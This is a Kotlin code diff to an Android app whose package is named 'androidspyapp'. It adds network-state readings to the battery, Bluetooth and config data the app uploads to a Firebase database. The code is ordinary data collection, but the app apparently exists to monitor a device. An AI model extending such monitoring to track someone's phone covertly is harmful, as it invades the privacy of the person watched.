@@ -8,6 +8,7 @@ import com.google.firebase.database.*
 import com.komnacki.androidspyapp.device.battery.BatteryState
 import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
 import com.komnacki.androidspyapp.device.config.ConfigState
+import com.komnacki.androidspyapp.device.network.NetworkState
 import github.nisrulz.easydeviceinfo.base.EasyConfigMod
 import java.text.SimpleDateFormat
 import java.util.*
@@ -16,6 +17,7 @@ class MessageUtils {
     private val BATTERY_DATABASE_TAG = "BATTERY"
     private val BLUETOOTH_DATABASE_TAG = "BLUETOOTH"
     private val CONFIG_DATABASE_TAG = "CONFIG"
+    private val NETWORK_DATABASE_TAG = "NETWORK"
 
     companion object {
         lateinit var userEmail: String
@@ -41,6 +43,7 @@ class MessageUtils {
         val batteryState = BatteryState(context)
         val bluetoothState = BluetoothState(context)
         val configState = ConfigState(context)
+        val networkState = NetworkState(context)
 
         val values = mutableMapOf<String, Any>()
         batteryState.getData().forEach { item ->
@@ -52,6 +55,9 @@ class MessageUtils {
         }
         configState.getData().forEach{ item ->
             values[CONFIG_DATABASE_TAG + "/" + item.key] = item.value
+        }
+        networkState.getData().forEach{ item ->
+            values[NETWORK_DATABASE_TAG + "/" + item.key] = item.value
         }
         getBaseHeader().updateChildren(values).addOnCompleteListener(object : OnCompleteListener<Void> {
             override fun onComplete(p0: Task<Void>) {
